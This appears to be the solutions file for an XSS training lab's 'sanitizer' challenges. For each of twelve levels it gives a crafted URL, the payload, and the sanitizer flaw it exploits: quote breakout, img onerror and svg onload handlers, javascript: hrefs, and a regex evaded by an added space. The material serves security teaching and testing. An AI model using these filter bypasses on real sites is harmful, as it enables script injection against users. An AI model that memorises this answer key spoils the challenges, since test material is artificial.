# sanitizer — solutions

Hand-rolled sanitizers that pass the most-obvious payload but break on context or attribute edge cases. Covers `sanitizer-...` and `sanitizer-edge-...`.

### sanitizer-level1

`/sanitizer/level1/?query=%22%20onmouseover=alert(1)%20x=%22`

- payload: `" onmouseover=alert(1) x="`
- context: body escaped, but title attribute is raw; quote breakout

### sanitizer-level2

`/sanitizer/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: recursive script/iframe/object strip; img untouched

### sanitizer-level3

`/sanitizer/level3/?query=%3Ca%20href=javascript:alert(1)%3Eclick%3C/a%3E`

- payload: `<a href=javascript:alert(1)>click</a>`
- context: whitelist allows `a`; href javascript: not stripped

### sanitizer-level4

`/sanitizer/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: only script tag is rewritten to HTML comment; img untouched

### sanitizer-level5

`/sanitizer/level5/?query=test`

- payload: `test`
- context: double HTML-escape applied to both body and title attr; no working sink (level is protected)

### sanitizer-level6

`/sanitizer/level6/?query=%3Ca%20href%20=%20%22javascript:alert(1)%22%3Eclick%3C/a%3E`

- payload: `<a href ="javascript:alert(1)">click</a>`
- context: protocol-strip regex requires no space before `=`; extra space evades

### sanitizer-edge-level1

`/sanitizer-edge/level1/?query=%22%20onfocus=alert(1)%20autofocus%20x=%22`

- payload: `" onfocus=alert(1) autofocus x="`
- context: tags stripped; reflected in input value; quote breakout

### sanitizer-edge-level2

`/sanitizer-edge/level2/?query=alert(1)`

- payload: `alert(1)`
- context: HTML-escaped chars never hit JS; unquoted `var x=...;` executes

### sanitizer-edge-level3

`/sanitizer-edge/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: only script tags recursively stripped; img survives

### sanitizer-edge-level4

`/sanitizer-edge/level4/?query=%3Cb%20onmouseover=alert(1)%3Ehover%3C/b%3E`

- payload: `<b onmouseover=alert(1)>hover</b>`
- context: whitelist keeps `b`; attributes on whitelisted tags not stripped

### sanitizer-edge-level5

`/sanitizer-edge/level5/?query=red%22%20onmouseover=%22alert(1)`

- payload: `red" onmouseover="alert(1)`
- context: inside `style="color: ..."`; quote breakout adds event handler

### sanitizer-edge-level6

`/sanitizer-edge/level6/?query=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: protocols stripped from value; attribute breakout instead
